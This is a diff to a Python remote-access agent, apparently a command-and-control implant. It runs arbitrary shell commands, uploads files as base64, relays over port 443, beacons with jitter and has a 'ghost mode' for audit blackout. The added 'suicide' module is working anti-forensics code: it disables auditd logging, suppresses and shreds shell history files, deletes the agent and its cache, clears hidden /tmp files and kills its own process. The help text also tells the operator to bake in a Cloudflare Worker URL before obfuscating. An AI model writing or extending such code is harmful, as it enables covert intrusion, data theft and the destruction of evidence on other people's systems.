@@ -32,11 +32,14 @@ Agent identity:
   Deterministic and stable across reboots. Print with:  python3 agent.py --id
 
 Supported commands:
-  <any shell string>         executed via /bin/sh, stdout+stderr returned
-  UPLOAD:/path/to/file       file read in binary mode, returned as base64
-  /module relay start [port] start HTTP relay on port (default 443)
-  /module relay stop         stop the relay
-  /module relay status       show relay state
+  <any shell string>              executed via /bin/sh, stdout+stderr returned
+  UPLOAD:/path/to/file            file read in binary mode, returned as base64
+  /module relay start [port]      start HTTP relay on port (default 443)
+  /module relay stop              stop the relay
+  /module relay status            show relay state
+  /module ghost on|off|status     toggle ghost mode (audit blackout + env scrub)
+  /module heartbeat INT JITTER    adjust beacon interval
+  /module suicide                 wipe agent file + history then self-terminate
 
 Environment variables (bake these before obfuscating):
   WORKER_URL      Cloudflare Worker URL   (required)
@@ -396,6 +399,30 @@ def _module_heartbeat(args: list) -> str:
     return f"[heartbeat: {BEACON_INT}s ±{JITTER}s]"
 
 
+def _module_suicide() -> str:
+    agent_file = os.path.abspath(__file__)
+    pid        = os.getpid()
+    cleanup = (
+        "if command -v auditctl >/dev/null 2>&1 && [ \"$(id -u)\" = \"0\" ]; then\n"
+        "    auditctl -e 0 2>/dev/null\n"
+        "fi\n"
+        "unset HISTFILE HISTFILESIZE HISTSIZE HISTCONTROL HISTIGNORE PROMPT_COMMAND\n"
+        "export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0 HISTIGNORE='*'\n"
+        f"shred -u \"{agent_file}\" 2>/dev/null || rm -f \"{agent_file}\"\n"
+        f"rm -rf \"{agent_file}c\" \"{os.path.dirname(agent_file)}/__pycache__\" 2>/dev/null\n"
+        "for _h in \"$HOME/.bash_history\" \"$HOME/.zsh_history\" \"$HOME/.sh_history\" \"$HOME/.history\"; do\n"
+        "    [ -f \"$_h\" ] && { shred -u \"$_h\" 2>/dev/null || rm -f \"$_h\"; }\n"
+        "done\n"
+        "find /tmp -maxdepth 1 -name '.*' -user \"$(id -nu)\" -delete 2>/dev/null\n"
+        f"kill {pid} 2>/dev/null\n"
+    )
+    def _run():
+        time.sleep(2)
+        subprocess.run(cleanup, shell=True, capture_output=True)
+    threading.Thread(target=_run, daemon=True).start()
+    return "[suicide: ok]"
+
+
 # ── Agent logic ───────────────────────────────────────────────────────────────
 
 def _agent_id() -> str:
@@ -432,6 +459,8 @@ def _exec(cmd: str) -> str:
             return _module_heartbeat(parts[1:])
         if parts[0] == "ghost":
             return _module_ghost(parts[1:])
+        if parts[0] == "suicide":
+            return _module_suicide()
         return f"[unknown module: {parts[0]}]"
     if cmd.startswith("UPLOAD:"):
         try:
